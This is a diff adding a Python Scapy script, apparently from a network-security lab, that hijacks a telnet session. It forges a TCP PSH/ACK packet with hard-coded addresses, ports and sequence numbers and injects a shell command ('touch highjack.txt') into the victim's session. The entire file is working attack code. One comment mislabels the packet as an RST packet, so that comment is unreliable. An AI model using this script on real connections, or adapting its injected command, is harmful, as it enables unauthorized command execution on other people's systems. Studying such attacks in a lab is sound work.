@@ -1,0 +1,18 @@
+#!/usr/bin/python3
+from scapy.all import *
+
+# Define IP and TCP header fields
+ip = IP(src="192.168.182.138", dst="192.168.182.141")   # source IP is the client IP , destination IP is the server IP
+tcp = TCP(sport=57490, dport=23, seq=2762967913, ack=3184499808, flags="PA") # source port should be checked, destination port should be 23, check TELNET packet for the next sequence number
+
+# Data to be injected
+data = "\rtouch highjack.txt\n\r"
+
+# Construct the RST packet
+pkt = ip/tcp/data
+
+# Display the packet structure for debugging
+ls(pkt)
+
+# Send the packet
+send(pkt, verbose=0)
